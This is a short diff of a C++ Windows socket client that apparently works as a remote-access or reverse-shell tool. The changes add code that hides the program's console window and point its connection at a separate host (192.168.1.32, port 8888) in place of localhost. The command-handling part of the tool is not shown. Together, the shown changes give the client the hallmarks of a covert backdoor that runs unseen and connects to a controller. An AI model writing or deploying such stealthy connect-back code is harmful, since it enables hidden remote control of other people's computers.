@@ -7,6 +7,8 @@
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
+
+#include <windows.h>
 #pragma comment(lib, "Ws2_32.lib")
 
 std::string currentDirectory = std::filesystem::current_path().string();
@@ -64,6 +66,9 @@ void receive_loop(SOCKET clientfd) {
 }
 
 int main() {
+    // hide console 
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
     // Initialize Winsock
     WSADATA wsaData;
     int wsaerr = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -83,7 +88,7 @@ int main() {
     serverAddress.sin_family = AF_INET;
     serverAddress.sin_port = htons(8888);
 
-    if (inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr) <= 0) {
+    if (inet_pton(AF_INET, "192.168.1.32", &serverAddress.sin_addr) <= 0) {
         std::cerr << "Invalid address\n";
         closesocket(clientfd);
         WSACleanup();
